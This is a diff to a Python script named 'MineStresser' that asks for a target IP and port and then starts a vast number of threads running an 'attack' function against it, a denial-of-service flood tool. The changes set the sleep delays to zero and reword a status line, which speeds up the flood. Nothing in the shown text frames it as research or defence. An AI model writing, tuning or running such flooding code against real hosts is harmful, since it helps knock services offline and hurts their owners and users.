@@ -19,19 +19,19 @@ os.system("figlet MineStresser")
 print("\033[92m")
 print("Credit: @MineGamerST")
 print(" ")
-time.sleep(1)
+time.sleep(0)
 ip = input("IP: ")
 port = int(input("Port: "))
-time.sleep(1)
+time.sleep(0)
 print(" ")
 os.system("clear")
 os.system("figlet MineStresser")
 print(" ")
-print(f"Running {ip} {port}")
+print(f"Running Packets > {ip} : {port}")
 # Start Attack
 
 for i in range(500000000000):
   t = threading.Thread(target=attack,args=(ip, port), daemon=True)
   t.start()
 while True:
-  time.sleep(1)
+  time.sleep(0)
